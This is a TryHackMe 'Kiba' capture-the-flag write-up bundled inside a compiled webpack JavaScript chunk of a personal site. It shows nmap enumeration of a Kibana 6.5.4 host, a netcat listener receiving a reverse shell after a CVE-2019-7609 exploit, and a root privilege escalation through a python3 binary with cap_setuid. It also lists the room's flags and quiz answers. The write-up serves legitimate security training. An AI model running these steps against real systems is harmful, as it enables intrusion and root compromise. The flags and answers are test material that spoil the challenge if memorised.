"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9049],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>m});var a=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var c=a.createContext({}),l=function(e){var n=a.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},u=function(e){var n=l(e.components);return a.createElement(c.Provider,{value:n},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},b=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,o=e.originalType,c=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),p=l(t),b=r,m=p["".concat(c,".").concat(b)]||p[b]||d[b]||o;return t?a.createElement(m,i(i({ref:n},u),{},{components:t})):a.createElement(m,i({ref:n},u))}));function m(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=t.length,i=new Array(o);i[0]=b;var s={};for(var c in n)hasOwnProperty.call(n,c)&&(s[c]=n[c]);s.originalType=e,s[p]="string"==typeof e?e:r,i[1]=s;for(var l=2;l<o;l++)i[l]=t[l];return a.createElement.apply(null,i)}return a.createElement.apply(null,t)}b.displayName="MDXCreateElement"},25200:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>l});var a=t(87462),r=(t(67294),t(3905));const o={},i="kiba",s={unversionedId:"Tryhackme/Kiba/Kiba",id:"Tryhackme/Kiba/Kiba",title:"kiba",description:"Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.",source:"@site/writeups/Tryhackme/Kiba/Kiba.md",sourceDirName:"Tryhackme/Kiba",slug:"/Tryhackme/Kiba/",permalink:"/writeups/Tryhackme/Kiba/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Kenobi",permalink:"/writeups/Tryhackme/Kenobi/"},next:{title:"LFI",permalink:"/writeups/Tryhackme/LFI/UFI"}},c={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"flags",id:"flags",level:2}],u={toc:l},p="wrapper";function d(e){let{components:n,...o}=e;return(0,r.kt)(p,(0,a.Z)({},u,o,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"kiba"},"kiba"),(0,r.kt)("p",null,"Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/kiba"},"kiba")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"CVE-2019-7609 - Kibana Timelion < 5.6.15 and 6.6.1"),(0,r.kt)("li",{parentName:"ul"},"Capabilities")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"flags"},"flags"),(0,r.kt)("p",null,"Are you able to complete the challenge?\nThe machine may take up to 7 minutes to boot and configure"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/kiba$ sudo nmap -A -sC -sV -sS -O -p- -Pn 10.10.254.89\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 18:16 CEST\nNmap scan report for 10.10.254.89\nHost is up (0.038s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE   VERSION\n22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)\n|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)\n|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)\n80/tcp   open  http      Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn\'t have a title (text/html).\n5601/tcp open  esmagent?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:\n|     HTTP/1.1 400 Bad Request\n|   FourOhFourRequest:\n|     HTTP/1.1 404 Not Found\n|     kbn-name: kibana\n|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c\n|     content-type: application/json; charset=utf-8\n|     cache-control: no-cache\n|     content-length: 60\n|     connection: close\n|     Date: Sun, 04 Oct 2020 16:20:10 GMT\n|     {"statusCode":404,"error":"Not Found","message":"Not Found"}\n|   GetRequest:\n|     HTTP/1.1 302 Found\n|     location: /app/kibana\n|     kbn-name: kibana\n|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c\n|     cache-control: no-cache\n|     content-length: 0\n|     connection: close\n|     Date: Sun, 04 Oct 2020 16:20:09 GMT\n|   HTTPOptions:\n|     HTTP/1.1 404 Not Found\n|     kbn-name: kibana\n|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c\n|     content-type: application/json; charset=utf-8\n|     cache-control: no-cache\n|     content-length: 38\n|     connection: close\n|     Date: Sun, 04 Oct 2020 16:20:09 GMT\n|_    {"statusCode":404,"error":"Not Found"}\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port5601-TCP:V=7.80%I=7%D=10/4%Time=5F79F58D%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,D4,"HTTP/1\\.1\\x20302\\x20Found\\r\\nlocation:\\x20/app/kibana\\r\\nk\nSF:bn-name:\\x20kibana\\r\\nkbn-xpack-sig:\\x20c4d007a8c4d04923283ef48ab54e3e6\nSF:c\\r\\ncache-control:\\x20no-cache\\r\\ncontent-length:\\x200\\r\\nconnection:\\\nSF:x20close\\r\\nDate:\\x20Sun,\\x2004\\x20Oct\\x202020\\x2016:20:09\\x20GMT\\r\\n\\r\nSF:\\n")%r(HTTPOptions,117,"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nkbn-name:\\x\nSF:20kibana\\r\\nkbn-xpack-sig:\\x20c4d007a8c4d04923283ef48ab54e3e6c\\r\\nconte\nSF:nt-type:\\x20application/json;\\x20charset=utf-8\\r\\ncache-control:\\x20no-\nSF:cache\\r\\ncontent-length:\\x2038\\r\\nconnection:\\x20close\\r\\nDate:\\x20Sun,\nSF:\\x2004\\x20Oct\\x202020\\x2016:20:09\\x20GMT\\r\\n\\r\\n{\\"statusCode\\":404,\\"e\nSF:rror\\":\\"Not\\x20Found\\"}")%r(RTSPRequest,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x2\nSF:0Request\\r\\n\\r\\n")%r(RPCCheck,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\\nSF:n\\r\\n")%r(DNSVersionBindReqTCP,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\nSF:\\n\\r\\n")%r(DNSStatusRequestTCP,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\nSF:\\n\\r\\n")%r(Help,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n")%r(SSLS\nSF:essionReq,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n")%r(TerminalSe\nSF:rverCookie,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n")%r(TLSSessio\nSF:nReq,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n")%r(Kerberos,1C,"HT\nSF:TP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n")%r(SMBProgNeg,1C,"HTTP/1\\.1\\x\nSF:20400\\x20Bad\\x20Request\\r\\n\\r\\n")%r(X11Probe,1C,"HTTP/1\\.1\\x20400\\x20Ba\nSF:d\\x20Request\\r\\n\\r\\n")%r(FourOhFourRequest,12D,"HTTP/1\\.1\\x20404\\x20Not\nSF:\\x20Found\\r\\nkbn-name:\\x20kibana\\r\\nkbn-xpack-sig:\\x20c4d007a8c4d049232\nSF:83ef48ab54e3e6c\\r\\ncontent-type:\\x20application/json;\\x20charset=utf-8\\\nSF:r\\ncache-control:\\x20no-cache\\r\\ncontent-length:\\x2060\\r\\nconnection:\\x\nSF:20close\\r\\nDate:\\x20Sun,\\x2004\\x20Oct\\x202020\\x2016:20:10\\x20GMT\\r\\n\\r\\\nSF:n{\\"statusCode\\":404,\\"error\\":\\"Not\\x20Found\\",\\"message\\":\\"Not\\x20Fo\nSF:und\\"}")%r(LPDString,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n")%r\nSF:(LDAPSearchReq,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n")%r(LDAPB\nSF:indReq,1C,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n")%r(SIPOptions,1C\nSF:,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/4%OT=22%CT=1%CU=37779%PV=Y%DS=2%DC=T%G=Y%TM=5F79F59\nOS:E%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1\nOS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN\nOS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1720/tcp)\nHOP RTT      ADDRESS\n1   36.44 ms 10.8.0.1\n2   36.70 ms 10.10.254.89\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 84.07 seconds\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Version: 6.5.4")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://github.com/mpgn/CVE-2019-7609"},"CVE-2019-7609"))),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/kiba$ nc -nlvp 4444\nlistening on [any] 4444 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.124.172] 44970\nbash: cannot set terminal process group (958): Inappropriate ioctl for device\nbash: no job control in this shell\nTo run a command as administrator (user "root"), use "sudo <command>".\nSee "man sudo_root" for details.\n\nkiba@ubuntu:/home/kiba/kibana/bin$ ls -la /home\nls -la /home\ntotal 12\ndrwxr-xr-x  3 root root 4096 Mar 31  2020 .\ndrwxr-xr-x 22 root root 4096 Mar 31  2020 ..\ndrwxr-xr-x  6 kiba kiba 4096 Mar 31  2020 kiba\nkiba@ubuntu:/home/kiba/kibana/bin$ cd /home\ncd /home\nkiba@ubuntu:/home$ ls\nls\nkiba\nkiba@ubuntu:/home$ cd kiba\ncd kiba\nkiba@ubuntu:/home/kiba$ ls\nls\nelasticsearch-6.5.4.deb\nkibana\nuser.txt\nkiba@ubuntu:/home/kiba$ cat user.txt\ncat user.txt\nTHM{1s_easy_pwn3d_k1bana_w1th_rce}\nkiba@ubuntu:/home/kiba$\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"THM{1s_easy_pwn3d_k1bana_w1th_rce}")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kiba@ubuntu:/home/kiba/kibana/bin$ getcap -r / 2>/dev/null\ngetcap -r / 2>/dev/null\n/home/kiba/.hackmeplease/python3 = cap_setuid+ep\n/usr/bin/mtr = cap_net_raw+ep\n/usr/bin/traceroute6.iputils = cap_net_raw+ep\n/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep\nkiba@ubuntu:/home/kiba/kibana/bin$ /home/kiba/.hackmeplease/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'\n<please/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'\nid\nuid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)\nSHELL=/bin/bash script -q /dev/null\nTo run a command as administrator (user "root"), use "sudo <command>".\nSee "man sudo_root" for details.\n\nroot@ubuntu:/home/kiba/kibana/bin# cat /root/root.txt\ncat /root/root.txt\nTHM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}\nroot@ubuntu:/home/kiba/kibana/bin#\n')),(0,r.kt)("p",null,"THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"What is the vulnerability that is specific to programming languages with prototype-based inheritance?")),(0,r.kt)("p",null,(0,r.kt)("img",{src:t(89469).Z,width:"857",height:"353"})),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Prototype pollution")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"What is the version of visualization dashboard installed in the server?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"6.5.4")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"CVE-2019-7609")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Compromise the machine and locate user.txt"),(0,r.kt)("li",{parentName:"ol"},'Capabilities is a concept that provides a security system that allows "divide" root privileges into different values')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"How would you recursively list all of these capabilities?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"getcap -r /")),(0,r.kt)("ol",{start:4},(0,r.kt)("li",{parentName:"ol"},"Escalate privileges and obtain root.txt")))}d.isMDXComponent=!0},89469:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/2020-10-04_18-40-39c90f4022fb200bc68c6de57d57d317.png"}}]);